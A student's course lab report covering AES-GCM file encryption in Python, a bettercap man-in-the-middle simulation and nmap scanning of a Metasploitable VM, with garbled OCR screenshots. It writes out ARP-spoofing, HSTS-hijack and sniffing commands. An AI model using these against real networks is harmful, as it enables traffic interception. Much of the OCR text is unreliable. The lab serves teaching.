## **Assignment No 01** 

|**Name:**Yash Ambadas Borude|**PRN No:**UCS23M1020|
|---|---|
|**Roll No:**20|**Class:**B.Tech Computer (A)|



**Subject:** Cryptography and Cyber Security 

### **Implement Secure Communication and Encryption Techniques Applications (AES-based file encryption system)** 

#### **Program Source Code** 

 `import os` 

```
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.exceptions import InvalidTag
```

```
def derive_key(password: str, salt: bytes) -> bytes:
```

```
    """Derives a secure 256-bit AES key from the user's password."""
```

```
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=480000,
    )
    return kdf.derive(password.encode())
```

```
def encrypt_file():
```

```
    filepath = input("\nEnter the path of the file to encrypt: ")
    if not os.path.exists(filepath):
        print("[-] File not found.")
        return
```

```
    password = input("Enter a strong password to encrypt this file: ")
    # 1. Read original file in binary mode
    try:
        with open(filepath, "rb") as f:
            plaintext = f.read()
    except Exception as e:
        print(f"[-] Error reading file: {e}")
        return
    # 2. Generate cryptographic randomness
    salt = os.urandom(16)
    nonce = os.urandom(12)
    # 3. Derive key and encrypt the binary data
    key = derive_key(password, salt)
    aesgcm = AESGCM(key)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    # 4. Save the encrypted file (Salt + Nonce + Ciphertext)
    enc_filepath = filepath + ".enc"
    try:
        with open(enc_filepath, "wb") as f:
            f.write(salt)
            f.write(nonce)
            f.write(ciphertext)
        print(f"\n[+] SUCCESS: File securely encrypted and saved as:
{enc_filepath}")
    except Exception as e:
        print(f"[-] Error writing encrypted file: {e}")
```

```
def decrypt_file():
    filepath = input("\nEnter the path of the .enc file to decrypt: ")
    if not os.path.exists(filepath):
        print("[-] File not found.")
        return
```

```
    password = input("Enter the password to unlock this file: ")
```

```
    # 1. Read the encrypted file
    try:
        with open(filepath, "rb") as f:
            file_data = f.read()
    except Exception as e:
        print(f"[-] Error reading file: {e}")
        return
    # A valid file must have at least 16 bytes for salt + 12 for nonce
    if len(file_data) < 28:
        print("[-] File is too small to be a valid encrypted file.")
        return
    # 2. Extract Salt, Nonce, and Ciphertext
    salt = file_data[:16]
    nonce = file_data[16:28]
    ciphertext = file_data[28:]
    # 3. Derive key and attempt decryption
    key = derive_key(password, salt)
    aesgcm = AESGCM(key)
    try:
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        # Remove .enc extension for the output file
        if filepath.endswith('.enc'):
            dec_filepath = filepath[:-4]
        else:
            dec_filepath = filepath + ".dec"
        # 4. Save the restored file
        with open(dec_filepath, "wb") as f:
            f.write(plaintext)
        print(f"\n[+] SUCCESS: File successfully decrypted and
restored as: {dec_filepath}")
```

```
    except InvalidTag:
        print("\n[!] ACCESS DENIED: Incorrect password or file has
been tampered with.")
def main():
    while True:
        print("\n" + "="*30)
        print("     AES FILE ENCRYPTOR")
        print("="*30)
        print("1. Encrypt a File")
        print("2. Decrypt a File")
        print("3. Exit")
        choice = input("Select an option (1-3): ")
        if choice == '1':
            encrypt_file()
        elif choice == '2':
            decrypt_file()
        elif choice == '3':
            print("Exiting tool. Goodbye!")
            break
        else:
            print("[-] Invalid option. Try again.")
if __name__ == "__main__":
    main()
```

###  **Steps** 

1. Create python program file 



<!-- Start of picture text -->
=<br>File Edit View Go Bookmarks Help<br>€ >M& ¢ fll MDesktop CSiab ASMT2<br>Places= Computer a<br>Be tati or im.<br>Hl Desktop ogram.py<br>(#) Recent<br><!-- End of picture text -->

2. Create a sample file to encrypt 



<!-- Start of picture text -->
[iy} hati®touch kati)secret.txt[-ADesktop/CCS-Lab/ASHT2]<br>[Skah$ echo "Thiskal):is[-/Oasktop/CCs-Lab/Aswt2secret message” > secret.txt}<br>[i {kali kali). [~Markttop/CCS-Lab/ASATE ]<br>$ cat secret. tet<br>This is secret message<br><!-- End of picture text -->

3. Open Terminal and encrypt the file 



<!-- Start of picture text -->
Lyla kal) [-/Desktop/ccs-Lab/ASHT2 }<br>$ python Program.py<br>AES FILE EMCRYPTOR<br>1. Encrypt a File<br>2. Oecrypt a File<br>3. Exit<br>Select an optian (1-3): 1<br>Enter the path of the file to encrypt: secret.tat<br>Enter a strung password to encrypt this fale: surajll<br><!-- End of picture text -->



<!-- Start of picture text -->
[+] SUCCESS: File securely encrypted and saved a5: secret, tat.enc<br><!-- End of picture text -->

4. Encrypted file will be created 



<!-- Start of picture text -->
Program.py secreLtct secret ixtenc<br><!-- End of picture text -->

5. Reading the encrypted file will show encoded text 



<!-- Start of picture text -->
c.f$ kalicat secret. kali} -[~/exktop/OCS-Lab/ASaT?txt.enc |<br>*$1Ceeaeeds+—H]4\ee eee]. \e1 ger?<br><!-- End of picture text -->

6. Decrypt the text with the same password 



<!-- Start of picture text -->
Program.py secret iktenc<br><!-- End of picture text -->



<!-- Start of picture text -->
p,“aue kal i)-[~/Desktop/CCS-Lab/ASAT2]<br>$ python Program.py<br>AES FILE ENCRYPTOR<br>1. Encrypt a File<br>2. Oecrypt a File<br>3. Exit<br>Select an option (1-3): 2<br>Enter the path of the .enc file to decrypt: secret. txt.enc<br>Enter the password to unlock this file: suraj<br>[+] SUCCESS: File successfully decrypted and restored as: secret.txt<br>AES FILE ENCRYPTOR<br>1. Encrypt a File<br>2. Decrypt a File<br>3. Exit<br>Select an option (1-3):<br><!-- End of picture text -->

7. Secret.txt file is created 



<!-- Start of picture text -->
[ka$s ie kal )- (~/Meakctop/CCS-Lab/ASIT2 ]<br>Program.py secret.txt secret.txt.enc<br>[ksi 9 kali) [~fasketop/CCS-Lab/ASaT |<br>$ cat secret. txt<br>This is secret message<br><!-- End of picture text -->

## **Assignment No 02** 

**Name:** Yash Ambadas Borude **PRN No:** UCS23M1020 **Roll No:** 20 **Class:** B.Tech Computer (A) 

**Subject:** Cryptography and Cyber Security 

### **Analyse Cryptographic Security and Communication Protocols Applications (MITM attack simulation in controlled environment)** 

##### **Configuration** 

Kali Network Adaptor : Bridged 

Private Network 

Mobile (Hotspot) — Connected To —> Windows Machine (Host) --Connected to bridge---> Kali Linux (Virtual Machine) 

IP Address 

Mobile : 10.126.134.214 



<!-- Start of picture text -->
Ly(tas@$ map -0halt16.126.134.214 )- (0) -Pn<br>Starting Map 7.99 ( https: //nmap.org } at 2026-89-85 00:31 +8530<br>Neap scan report for 10,126.134.214<br>Hase is up (@.a05as Latency).<br>Wot shown: 999 closed tep ports (reset)<br>PORT STATE SERVICE<br>53/tcp open domain<br>MAC Address: 1E:16:16:C1:87:7F (Unknow)<br>Device type: phone<br>Running: Google Android 9.x]18.x111.x, Linux 4.x<br>QSOS CPE:details:cpe:/ozgoogle:android:9Android 9 - 11 (Linuxcpe:/o:google:android:4.9 - 4.14) 16 cpe:/o:google:android:11 cpe:/a:Linux:1inux_kernel:4<br>Network Distance: 1 hop<br><!-- End of picture text -->

- **Windows Host:** 10.126.134.181 



<!-- Start of picture text -->
Wireless LAN adapter Wi-Fi:<br>Connection-specific DNS Suffix .:<br>IPv6 Address... . 1. 1. 1 « « 3 2409:00c2:841U:c83c: 5c9d:573e:9ebe:b59e<br>Temporary IPv6 Address. . . . . . : 2409:4@c2:8414:c83c:5@6a:acbH:f3b8:97c1<br>Link-Llocal IPv6 Address . . . . . : fe80::fef1:d874:71F9:507e%22<br>IPv4 Address... ..... .. « 3 106.126.134.181<br>Subnet Mask... 1... 1. ©. t 255.255.255.0<br>Default Gateway... . . . . « . 3 Fe80::1cle:16FF:fecl:877F%22<br>106.126.134.214<br><!-- End of picture text -->

- **Kali Linux Target/Attacker VM:** 10.126.134.132 



<!-- Start of picture text -->
Cimus kali}-[-]<br>$ ip addr | grep "inet"<br>127.0.@.1/B scope host lo<br>6 ::1/128 scope host noprefixroute<br>2@.126.134.132/24 brd 168.126.134.255 scope global dynamic noprefixroute eth<br>G66 2409:48c2:6414:c83c:Fe8@s:d4d9:£251:98a4:8d07/6428a:53b9:9a46:316e/64scope Link noprefixroutescope global dynamic nuprefixroute<br>172.17.8.1/16 brd 172.17.255.255 scape global dackera<br><!-- End of picture text -->

3. Step-by-Step Simulation Execution 

   - **Step 1:** Start Kali Linux and launch the terminal. 

   - **Step 2:** Launch Bettercap specifying the network interface. 

- `sudo bettercap -iface eth0` 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
[y(kati@$ sudo bettercaptati)-[-1 -iface eth<br>bettercap v2.23 (built for linux amd64 with go1.16.4) [type ‘help’ for a List of commands]<br>><br>Pe | » ne Csys.log] [J] Could not find mac for 106.126.134.214<br><!-- End of picture text -->

- **Step 3:** Use the help command to view available modules. 



<!-- Start of picture text -->
» (¥0251:39] [sys.log] [JJM] Could not find mac for 19.125.134.216<br>» help<br>help MODULE : List available cowwands or show module specific help if no module name is provided.<br>active : Show information about active nodules.<br>quit : Close the session and exit.<br>Sleep SECONDS : Sleep for the given amount of seconds.<br>get NAME : Get the value of variable WAME, use * alone for all, or WAME* as a wildcard.<br>set NAME VALUE : Set the VALUE of variable NAME,<br>read VARIABLE PROMPT : Show a PROMPT to ask the user for input that will be saved inside VARIABLE.<br>Clear : Clear the screen.<br>include CAPLET : Load and run this caplet in the current session.<br>! COMMAND : Execute a shell command and print its output.<br>alias WAC NAME : Assign an alias to a given endpoint given its MAC address.<br>fodaiLes<br>any-proxy ><br>api.rest ><br>arp.spoof ><br>ble.recon ><br>caplets ><br>dhcp6.spoof ><br>ans. spoof ><br>events.stream > running<br>gos ><br>hid ><br>http.proxy ><br>http.server ><br>https.proxy ><br>https. server ><br>fac.changer ><br>mysql.server ><br>net-probe ><br>net recon ><br>net.sniff ><br>packet.proxy ><br>sym.scan ><br>tep-proxy ><br>ticker ><br>al ><br>update ><br>wifi ><br>wol ><br>ee ><br><!-- End of picture text -->

The required modules for this simulation include: **arp.spoof** , **caplets** , **dns.spoof** , **net.probe** , **net.recon** , and **net.sniff** . 

● **Step 4:** Initialize discovery and monitoring modules. Module details can be inspected using **help <module-name>** . 

Enable network probing, network reconnaissance, and full-duplex ARP spoofing: 

 `net.probe on` 



<!-- Start of picture text -->
<br><!-- End of picture text -->

 `net.recon on` 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
2 feocdeo15) feys- 108 UT starting net.recon 23. requirement for net.srobe<br>m» net.net. refe@:54:18]re[ee:54:18] [endpoint[endpoint new]new] endpointendpoint 10.126.134.18110.126.134.214 detected(WORKGROUP)as detected1e:ie:16:c1:87:7F.as b0:dc:ef :db:c6:99.<br>» nee-recon an<br>» (W0!56:25] [sys.log] [MI] module net.recon 1s already running<br>» [80:54:28] [endpoint. lost] endpoint (WORKGROUP) be: dc:eF :db:c6:99 Lost.<br>»<br>me b» np orssez0} e t.prabe onCencpoint: toot] endoetat Ter 1e:16:€1:87:7F lest.<br><!-- End of picture text -->

 `set arp.spoof.fullduplex true` 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
» set arp.spoof.fullduplex true<br>» (08:55:23) [endpoint.lost] endpoint Je: 1e:16:c1:87:7F lost.<br>: >» pews5-271 [endpoint lost] endpoint (WORKGROUP) be: dc:ef:db:6:99 Lost.<br><!-- End of picture text -->

- **Step 5:** Discover available devices on the network using **net.show** . 



<!-- Start of picture text -->
bot BEM > net.show<br>ee eee ee<br>110.126.136.132 | we:uc:29:F6:2b:3@ | ethe eB en Bersi:39<br>0.126.134.1981 | b@:dc:ef:db:c6:99 | WORKGROUP 5.2 kB | 2.3 kB | 0:55:48<br>1@,126.134.214 | le:1e:16:¢1:87:7F 2.5 kB | 3.7 kB | 00:55:49<br><!-- End of picture text -->

- **Step 6:** Set the target IP address and enable ARP spoofing. 



<!-- Start of picture text -->
» arp.spuof_onset arp.spoof targets 10.126.134.214<br>» [49(wo :57:09] [sys.1og] tH(Ml) MEMBERS arpFull spoofdupl e rx s tarted,poofing proena b led,ing 1 1ftargth e ts.router has ARP spoofing mech<br>anisms, the attack will fail.<br>» (00:57:18) [endpoint.lost] endpoint (WORKGROUP) be:dc<br>b ef :db:<6:99 Lost.<br>» [aes57:42] endpoint Lost] endpoint Ye:1e:16261:87:7F Lost.<br><!-- End of picture text -->

- **Step 7:** Display available caplets using **caplets.show** . 



<!-- Start of picture text -->
» caplets. show<br>~ Jusr/local/share/bettercap/caplets/ap.cap 5708<br>crypto-niner/crypte-winer fust/local/share/bettercap/caplets/crypto-miner/crypto-miner .cap 666 8<br>doumlond-autopen/downloed-autopm | /usr/lacal/share/bettercap/caplets/dewnload-autopym/dowmlead-autopyn.cap | 2.6 kB<br>fh-phish/fb-phish Jusr/local/share/bettercap/caplets/fb-phish/fb-phish.cap 108<br>sitspoof/gitspoot Zusr/local/share/bettercap/caplats/gitspoof/gitspooF cap 216 8<br>5 Justflocal/share/bettercap/caplets/gps.cap 109 B<br>hatohd Jack/hstshi jock Zust/Local/share/bettercap/caplets/hstshi jack/hst shi jack.cap 3.0 kB<br>http-req-dump/hrttp-req—dump Juse/lacal/share/bettercap/caplets/http-req-dunp/http—req-dunp.cap 591 8<br>hetp-ud dusr/local/share/bettercap/caplets/http-ui.cap 382 8<br>betps—ui Jusr/local/share/bettercap/caplets/https-ui.cap 661 8<br>Jsinject/jsinject Just/local/share/bettercap/caplets/jsinject/jsinject.cap 2108<br>Aocet-sniffer fusr/local/share/bettercap/caplets/Local-sniffer.cap 24a B<br>‘Lngin-sanager-abase/login-san-abuse | /usr/local/share/bettercap/caplets/lagin-manager-abuse/login-man-abuse.cap | 236 8<br>mana dusr/local/share/bettercap/caplets/mana.cap as<br>massceauth Jusr/local/share/hettercap/caplets/massdeauth.cap 3@2 8<br>mites Jusr/local/share/bettercap/caplets/mitaé .cap 5518<br>netwon fusr/local/share/bettercap/caplets/netmon.cap 28<br>passwords duse/local/share/bettercap/caplets/passwords.cap 2B<br>pita Jusr/local/share/bettercap/caplets/pita.cap you a<br>Proxy-script-test/proxy-script-test | /usr/local/share/bettercap/caplets/proxy-script-test/proxy-script-test.cap | 57 B<br>pamagotchi-auto Just/local/share/bettercap/caplets/pamagotchi-auto.cap 3308<br>Pamagotchi-sanual fust/local/share/bettercap/caplets/pwnagotchi-manual.cap 446 B<br>rogee-aysql-server duse/lacal/share/hettercap/caplets/rague-mysql-server.cap sei 8<br>refa/rtfa dusr/local/share/bettercap/caplets/rtfa/rtfa.cap 210 8<br>simple-passuords-saiffer Jusr/local/share/bettercap/caplets/sinple-passwardssnifFer.cap 131 8<br>sshproxy Just/local/share/bettercap/caplets/sshproxy.cap 4.7 kB<br>ateal-cookies/steal-cookies fust/local/share/bettercap/caplets/steal-cookies/steal-cockies.cap 138 B<br>tcp-req-dump/tcp-req-dump Juse/lacal/share/bettercap/caplets/tcp-req-dunp/tep-req-dump.cap 413 8<br>web-ovarrida/wob-override Jusr/local/share/bettercap/caplets/web-override/web-averride..cap 256 8<br>» (08:57:47) [endpoint.lost] endpoint (WORKGROUP) b8:dc:ef :db:c6:99 Lost.<br><!-- End of picture text -->

   - **Step 8:** Import and execute the HSTSHijack caplet. 

- `include hstshijack/hstshijack` 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
~ ® include hstshijack/hstshijack<br>[80:59:63] (sys.log] (MMB) module net.recon is already running<br>[ea:59:85] [endpoint.new] endpoint 1@.126.134.<br>[0u:59:85] [endpoint.new] endpoint 1®.126.134.214181 (WORKGROUP)detected as detected1¢:1¢:16:c1:87:7F.as bé:de:ef:db:c6:99.<br>[88:59:16] [endpoint.Lost) endpoint (WORKGROUP) b@:1ic:ef:db:c6:99 Lost.<br>[80:59:17] Lendpoint.new] endpoint 216.126.134.181 detected as bO:dc:ef :db:c6:99.<br>[80:59:17] (endpoint. lost] endpoint le:1¢:16:c1:87:7# Lost.<br><!-- End of picture text -->

- **Step 9:** Enable packet sniffing to capture network traffic. 



<!-- Start of picture text -->
set net.sniff.local true<br>[81:01:17] [endpoint.new] endpoint 180.126.134.181 detected as bO:dc:ef:db:c6:99,<br>[81:81:17] [endpoint.nem] endpoint 1@.126.134.214 detected as 1e:1¢:16:¢1:87:7f.<br><!-- End of picture text -->



<!-- Start of picture text -->
net.snlf?[81:81:56] on[endpoint.new] endpoint 216.126.134.181 (WORKGROUP) detected as b0:dc:eF :db:c6:99.<br><!-- End of picture text -->

- **Step 10:** Analyze captured traffic output in real-time. 

|[e1:02:13]<br>[o1:02:13]<br>|(net. sniff.mdns]<br><br>|10.126.136.214<br><br><br>|PTRqueryfor<br>|_googlecast._tcp<br>loc<br> <br>|.<br>al<br> <br>|
|---|---|---|---|---|---|
|<br> <br><br>|<br> [net.sniff-ndns]<br> <br>|1.126.134.2146<br><br><br>|<br>PTRqueryfar <br>|_676A<br><br> <br>|263.<br><br> <br>|
|<br><br><br>|<br> <br> <br>||<br> <br>|<br><br> <br> <br>|<br><br> <br> <br>|
|<br><br><br>|<br> <br><br>||<br>|<br> <br> <br>|<br> <br><br>|
|<br> <br><br>|<br>  <br> <br>||<br><br>|<br> <br><br>|<br> <br><br><br>|
|<br> <br><br>|<br> Cnet.sniff.ndns]<br>  <br>|10:126.136.214<br><br><br>|<br>PTRqueryfor<br>|674A8263._sub<br> <br>|googlecast.<br><br> <br>|
|<br> <br><br>|<br> (net. sniff.mdns]<br> <br>|10.126.136.214<br><br><br>|<br>PTRqueryfor <br>|_8E6C<br> <br>|65D.<br> <br>|
|<br> <br><br>|<br>  <br><br><br>||<br><br><br>|<br> <br><br><br>|<br> <br><br><br>|
|<br> <br><br>|<br> (<br>.sniff-n<br> <br>|26.134.21<br><br><br><br>|<br><br>o <br><br>|_674A6<br><br><br>|263._<br><br><br><br>|
|<br><br>|(net .sniff-ndns]<br><br>|18.126.134.214<br><br>|PTRqueryfor<br>|<br>8€6CB66D._sub<br>|_googlecast.<br><br><br>|
|<br> <br>[e1:02:14] <br>[o1:02:14]<br>|<br> Cendpoint.new] endp<br> (net.sniff.mdns]<br> <br>|int 28.126.134.18<br>10.126.136.214<br>:<br><br>|<br> (WORKGROUP) de<br> PTR query for <br>|ected as b@:dcref :<br>_674A8263._sub.<br>|b:c6:99-<br>_googlecast.<br>tcp.local<br>|
|<br><br>|<br><br><br>|||||
|<br> <br><br>|<br> (<br>.sniff-<br><br>|64<br><br>|<br><br>o <br>|_SEGC<br><br>|GED.<br><br>|
|<br>[91:02:14] <br>[81:62:14]<br>|(net.sniff-dns} MMM <br> **(net.snif**#-ndns]<br>|18.126.134,214 > <br>10,126.136,2**14**<br>|ocal : 1€1.134.<br>**PTRqueryfor**|<br>26.18.in-addr.arpa <br>**_**CC32E753._sub._goog<br>|1s<br>ecast._tcp.Local<br>|
|<br><br>|<br>f mins]<br>|410.126.136.2<br>:<br><br>|<br><br>|googlecast._tcp<br><br>|.<br><br>|
|<br><br>|[net.sniff.ndns]<br><br>|18.126.134.214<br>:<br><br>|PTR query far <br>|—googlecast._tep.loc<br><br>|al<br><br>|
|[o1182:16]<br><br>|(net.sniff.ndns]<br>|1.126.134.216<br><br><br>|PTRqueryfor<br>|—SEGC<br> <br>|G5D.<br> <br>|
|<br> <br>|<br>||<br>|<br>|<br>|
|<br><br><br>|<br>-snif#-n<br>  <br>|01<br>:<br><br>|<br><br><br>|“googlecast._tep.loc<br>|<br>al<br><br>|
|[81:62:14] <br>[e1:02:14] <br>[o112:16] <br>[01:02:14] <br>[01:02:14]<br><br>|(net. sniff-mdns]<br> [net sniff-ndns]<br> (net.sniff.ndns]<br> [**net**.sniff-**ndns]**<br><br><br><br>|10,126.136,214<br><br>18:126.136.214<br>:<br>1N.126.134.216<br>:<br>**1**80.126.134**.214**<br>:<br><br>|PTR query for <br> PTR query far <br> PTR query for <br>**PTRqueryfor**<br><br>|_674A6243._sub._g<br>_676A<br>sub.goog<br>—googlecast._tcp.loc<br>_8E6**C**B66D._sub._goog<br><br><br>|oglecast._tcp.<br>local<br>€263.<br>lecast._tep.Local<br>al<br>ecast._tcp.Local<br><br><br>|
|<br> <br>[81:62:14] <br>[e1:02:14]|<br> (<br>.snif#.<br> (net<br>sniff mdns]<br>|0:126.134<br><br>10,126.136.214<br>:<br><br>|<br><br><br> PTR query for <br>|~<br>C32<br>sub._goog<br>_CCIADB4S._sub._g<br>|753.<br>lecast. tep.Local<br>ooglecast._tep.<br>Local<br>|
|<br>|[net.sniff-ndns]<br>|18:126.138.214<br>:<br><br>|PTR query far <br>|—googlecast._tcp.lec<br>|al<br>|
|[oa:82:16] <br>[01:02:14] <br>[01:02:14]<br>[e1:02:15]<br>|(net.sniff-ndns]<br> (net.sniff-ndns]<br>(net.sniff.ndns]<br><br>|1N.126.134.216<br>:<br>108.126.134.214<br>:<br>10-126.134.214<br><br><br>|PTR query for <br><br>PTR query for <br>PTRqueryfor <br>|_674A6263._sub. goog<br>_8€6C866D. _sub._goog<br>“CCIA<br>sub.-goog<br> <br>|ecast._tep.Local<br>lecast. tcp. local<br>84S.<br>lecast.tep.Local<br> <br>|
|<br> <br><br>|<br> (netsniff-mdns]<br> <br>|10,126.136.214<br><br><br>|<br>PTRqueryfor <br>|<br><br>_CC32<br> <br>|<br> <br>753.<br> <br>|
|<br> <br><br>|<br>  <br><br><br>||<br><br><br>|<br> <br><br><br>|<br> <br><br><br>|
|<br> <br>[#1:82:45] <br>[01:02:15] <br>[01:02:16]<br>|<br> (<br>.sniff-n<br> (net.sniff.mdns]<br> (net.sniff.ndns]<br>  <br>|n.126.134.218<br>:<br>18.126.134.214<br>:<br>410.126.134.214<br><br><br>|<br><br>o<br> PTR query for  <br>PTRqueryfor <br>|674A6<br>sub.goog<br>_8€6C866D. _sub._goog<br>“CCIA<br>sub.goog<br>|263._<br>ecast._tep.Local<br>lecast. tcp.Local<br>84S.<br>ecast.tcp.Local<br><br>|
|<br> <br><br>|<br> (net. sniff.mdns]<br> <br>|10,126.136.214<br><br><br>|<br>PTRqueryfor<br>|<br> <br>spotify-connect<br>|<br>  <br>_tep.<br><br>|
|<br> <br><br>|<br>  <br><br><br>||<br><br><br>|||
|<br> <br><br>|<br> (<br>.sniff-n<br> <br>|N.126.134.2 6<br><br><br>|<br><br>o<br>|674A6<br><br>|263._<br><br><br>|
|<br><br><br>|(net.sniff-mdns]<br> <br><br>|108.126.134.214<br><br><br>|PTR query for <br>|<br>8€6C866D._sub<br><br>|_googlecast.<br><br><br><br>|
|<br>[81:02:16] <br>[o1:02:17]|(net.snif#.ndns]<br> (net. sniff<br>.mdns]<br>|10.126.134.214<br><br>10.126.136.214<br>:<br><br>|PTR query for <br> PTR query for <br>|CC32E753._sub<br>_CC1A<br>sub.goog<br>|_googlecast.<br>tcp.Local<br>D80S.<br>ecast._tep.local<br>|
|<br>|[net .sniff.ndns]<br>|1.126.134.2146<br>:<br><br>|PTR query far <br>|<br>—spotify-connect._te<br>|<br>p.lacal<br>|
|[o1!82:19] <br><br>|(net.sniff-ndns]<br><br>|1n.126.134.216<br><br><br><br>|PTR query for <br><br>|—spotlfy-connect._te<br> <br>|p.Lecal<br>|
|[91:62:21] <br>|(netsniff-mdns]<br>|WORKGROUP<br>:<br>Unk|own query<br>For N|o..dosvc.<br>||
|<br>|(net-sniff-ndns]<br>|418.126.136.214<br>:|PTR query for|_spotify-connect. te<br>|p.Local<br>|
|[e1:02:22]<br>|(net.sniffmdns]<br>|WORKGROUP<br>:Unk<br><br>|ownqueryfor<br>|eo._dosvc.<br><br>||
|<br>|<br>|<br><br>|<br>|||
|||||||
|<br>a:aché:F3BB<br>|<br>:97¢1,<br>FeBe::feF1:d<br>|<br>74:71F9:507e||<br>|<br>|
|[e1:02:22]<br>|<br>(net .sniff-ndns]<br>|WORKGROUP<br>:<br>Unkn<br><br>|own query For N<br>|eo.dosve._tcp.<br><br>||
||[net.snif#.ndns]|WORKGROUP<br>:Neo|localis2409:4|c2:8414:cB3c:5c8d:5|3e:9ebe:bS%e,2469:40c2:8414:c83c:56a:acbé: F3b8:97c1]|
|<br>» FeO: Fe<br>|<br>F1:d0742719:5078<br>|<br><br>|<br> <br>||<br><br>|
|[o1:82:22] <br>|[net.sniff.ndns] MM<br><br>|M WORKGROUP<br>; Neo.<br>|Local<br>1s 189.126|.134.181, 2489:60c2:|8614:e83C:ScBd:573e:Debe:bs9e,<br>2609:48C7278614:c8IC:5A6||
|a:ach4:F3DB<br>(01:62:23)|:97C1,<br>FeBo:: FeF1:4<br>[netsniffndns|74:71F9:5070<br>18.126.134.214|PTRquery<br>For|spotifyaconnect.tc|p.local|



## **Assignment No 03** 

|**Name:**Yash Ambadas Borude|**PRN No:**UCS23M1020|
|---|---|
|**Roll No:**20|**Class:**B.Tech Computer (A)|
|**Subject:**Cryptography and Cyber Security||



### **Perform Reconnaissance and Vulnerability Assessment on a Target Environment Applications. (Analyse open ports and services on a virtual machine)** 

### **Tools & Software Requirements** 

- Kali Linux (Attacker Machine) 

- Metasploitable machine (Target) 

- Nmap 

### **Environment IP Configuration** 

- **Kali Linux (Attacker):** 10.126.134.132 

- **Metasploitable (Target):** 10.126.134.18 

### **Execution Steps & Methodology** 

**Step 1: Start Metasploitable2 Machine** 

- **Username:** msfadmin 

- **Password:** msfadmin 



<!-- Start of picture text -->
ast login at Aug EDT c ttyl<br>»:v/help.ubuntu.con<br><!-- End of picture text -->

**Step 2: Start Kali Linux Machine** 



<!-- Start of picture text -->
. | we ¥<br>ginal a 9 dist i<br>— 'wy Hi<br>Zoo > a es<br>HARDER<br>.<br><!-- End of picture text -->

**Step 3: Network Discovery** 

 [ `nmap -sn 10.126.134.0/24` 



<!-- Start of picture text -->
[Se a) Em<br>$ nmap -sn 1@.126.134.0/24<br>Starting Wap 7.99 ( https://nmap.org ) at 2026-89-85 @1:37 +8530<br>(map scan report for 1@.126.134.18<br>Host is up (@.@8@49s Latency).<br>WAC Address: B@:8C:29:98:33:18 (vasare)<br>fmap scan report for 16.126.134.181<br>Host is up (8.08135 Latency}.<br>MAC Address: B@:DC:EF:0B:€6:99 (Intel Corporate}<br>Mmap scan report for 160.126.134.214<br>Host is up (@.@025s Latency}.<br>WAC Address: 1€:1£°16:C1:87:7F (Unknown)<br>fmap scan report for 180.126.134.132<br>Host is up.<br>Hmap done: 256 IP addresses (4 hosts up) scanned in 3.22 secands<br><!-- End of picture text -->

● 10.126.134.18 is Metasploitable Machine’s IP 



<!-- Start of picture text -->
msfadmin@metasploitable:~§ ip addr<br>1 lo LOOPBACK, UP,LOVER_UP> mtu 16436 qdisc noqueue<br>link/ loopback 00:00:00:00:00:60 brd 90:60:00:00:00:00<br>inet 127.0.0.1/8 scope host lo<br>ineté ::1/128 scope host<br>valid_Ift forever preferred_Ift forever<br>2: ethO: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000<br>link/ether 00:6¢:29:90:33:1a brd fF sffsfh fe ee see<br>inet 10.126.134.18/24 brd 10.126.134.255 scope global eth<br>inet6 2409 :40c2:8414:c83c :20c :29ff :fe90:331a/64 scope global dynamic<br>valid_Ift 7093sec preferred_Ift 7093sec<br>inet6 fe8O::20c:29ff :fe90:331a/64 scope link<br>valid_Ift forever preferred_Ift forever<br>3: ethi: <BROADCAST,MULTICAST> mtu 1500 qdisc noop qlen 1000<br>link/ether 00:0c:29:90:33:24 brd ff:ff:ff iff ff iff<br>msfadmin@metasploitable:~§<br><!-- End of picture text -->

**Step 4: Port Scanning & Service Enumeration** 

 `nmap -p- -sS 10.126.134.18` 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
Eee kath) --9<br>$ nmap -p- -sS 1@.126.134.18<br>Starting Nmap 7.99 ( https: //mmap.arg ) at 2826-@9-@5 @1:39 +0578<br>Wmap scan report for 168.126.134.138<br>Host is up (8.8013s latency).<br>Not shown: 65585 closed tcp ports (reset)<br>PORT STATE SERVICE<br>2iftep open ftp<br>22/tep open ssh<br>23/tcp open telnet<br>25/tcp = open smtp<br>53/tcp open domain<br>seftcp open http<br>111/tep open rpebind<br>139/tcp open netbios-ssn<br>445/tcp open microsoft-ds<br>S12/tcp open exec<br>S13/tcp open Login<br>516/tcp open shell<br>1099/tcp open rmiregistry<br>1524/tcp open ingreslock<br>2e4g/tcp open nfs<br>2121/tcp open ceproxy-ftp<br>3386/tcp open mysql<br>3632/tcp open distccd<br>5432/tcp open postgresql<br>5900/tcp open vnc<br>6ea@/tcp open X11<br>G6H7/tep open irc<br>G697/tcp open ircs-u<br>eees/tcp open ajpi3<br>81e¢/tcp open unknown<br>a7B7/tcp open msgsrvr<br>34581/tep open unknown<br>37886/tcp open unknown<br>37988/tcp open unknown<br>547@7/tcp open unknown<br>MAC Address: @8:0C:29:90:33:1A (VMware)<br>Wmap done: 1 IP address (1 host up) scanned in 7.84 seconds<br><!-- End of picture text -->

 `nmap -O 10.126.134.18` 



<!-- Start of picture text -->
<br><!-- End of picture text -->



<!-- Start of picture text -->
